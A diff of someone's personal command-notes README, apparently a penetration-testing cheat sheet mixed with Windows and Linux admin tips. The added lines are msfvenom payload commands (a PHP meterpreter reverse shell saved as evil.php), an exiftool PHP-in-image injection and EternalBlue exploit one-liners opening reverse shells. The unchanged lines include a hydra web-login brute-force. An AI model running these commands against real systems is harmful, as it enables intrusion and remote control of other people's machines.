@@ -1,16 +1,31 @@
-# Teh Codes
+# Mysterious Rantings...
 
-  // Gists  
+  // My Gists  
   
  https://gist.github.com/timsonner  
  
- // New Gist
-
- // Generate shellcode for windows 64  
-
-     msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin
+ // New Gist Shortcut  
  
  https://gist.github.com  
+
+ // Payloads with msfvenom - Linux  
+
+     msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin  
+     msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip of multi/handler> LPORT=4444 -f raw -o evil.php  
+     
+// PHP payload with Exiftool - Linux  
+
+    exiftool -Comment='<?php phpinfo(); ?>' ./street-cat.jpg  
+     
+ // Metasploit - Linux  
+ 
+     msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;setg RHOSTS $IP;setg LHOST tun0;run"  
+     msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set payload windows/x64/shell/reverse_tcp;setg RHOSTS $IP;setg LHOST tun0;run"  
+     sessions -u 1  
+     sessions -i 5  
+     background  
+     search shell_to_meterpreter  
+     search php/meterpreter/reverse_tcp  
  
  // Find processes running on a port - Windows  
  
@@ -77,11 +92,15 @@
  
      (Get-WmiObject Win32_ComputerSystem).Domain
 
- // Network connections dialog - Windows
+ // Network connections - Windows
  
-     ncpa.cpl
+     ncpa.cpl  
+
+ // User Management - Wind0ze  
+
+     lusrmgr  
      
- // Advanced Rename - Windows
+ // Advanced Rename / User account removal - Windows
  
      sysdm.cpl  
  
@@ -136,7 +155,7 @@
 
     sudo usermod -a -G vboxusers $USER
 
- // DefectDojo Setup - Linux
+ // DefectDojo Setup - Debian  
 
     git clone https://github.com/DefectDojo/django-DefectDojo &&  cd django-DefectDojo
     sudo apt install docker-compose
@@ -165,12 +184,6 @@
     sudo gvm-start
     sudo gvm-setup  
     
- // OpenVAS - Kali  
-
-    gvm-manage-certs -a -f  
-    runuser -u _gvm -- gvmd --get-users --verbose  
-    runuser -u _gvm -- gvmd --modify-setting 78eceaec-3385-11ea-b237-28d24461215b --value <user id>  
-     
  // Connect to Ethernet - Linux
 
     ip link list
@@ -222,10 +235,6 @@
  // Unzip a disc image - Linux
  
      unxz -v <Path to image>.img.xz  
- // Wine64 - MacOS
- 
-     brew install wine-stable
-     WINEARCH=win64 WINEPREFIX=~/.wine64 winecfg  
 
 # Nmap notes  
 
@@ -257,7 +266,7 @@
 
 -sV: Identify services/versions scan.  
 -sS: Syn "Half-open" aka "Stealth" scan   
--sU: UDP scan
+-sU: UDP scan  
 -sT: TCP Connect scan  
 -sn: Disable port scan aka "Ping sweep"  
 -sL: Test scan "List" targets  
@@ -271,6 +280,7 @@
 -PM: ICMP Address Mask (Type 17,18)  
 -PR: ARP Ping *local subnet  
 -PU: UDP Ping  
+-P0: Ping off  
 
 ## Output  
 -oA: All  
@@ -293,14 +303,19 @@
     nmap -R --dns-servers 192.168.6.1  
     nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>    
     nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <ip>  
+    nmap --script=http-headers  
+    nmap --script=http-title
+    
     
 -PS80,443,8080
     
 Script Help:  
-nmap --script-help "smb-* and discovery" 
+nmap --script-help "smb-* and discovery"  
+nmap --script-help "http-*" | grep -i "headers"  
 
 Find script:
-ls -l /usr/share/nmap/scripts/*dns* 
+ls -l /usr/share/nmap/scripts/*dns*  
+ls -l /usr/share/nmap/scripts/*smb*  
 
 Download script:
 sudo wget -O /usr/share/nmap/scripts/<script-name>.nse https://svn.nmap.org/nmap/scripts/<script-name>.nse  
@@ -313,7 +328,7 @@ sudo wget -O /usr/share/nmap/scripts/<script-name>.nse https://svn.nmap.org/nmap
 
 Web Portal  
 
-     hydra -l <username> -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt <hostname> http-post-form "/admin/login/:username=^USER^&password=^PASS^:F=incorrect" -V
+     hydra -l <username> -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt <hostname> http-post-form "/admin/login/:username=^USER^&password=^PASS^:F=incorrect" -V  
 
  // Tshark filters  
 
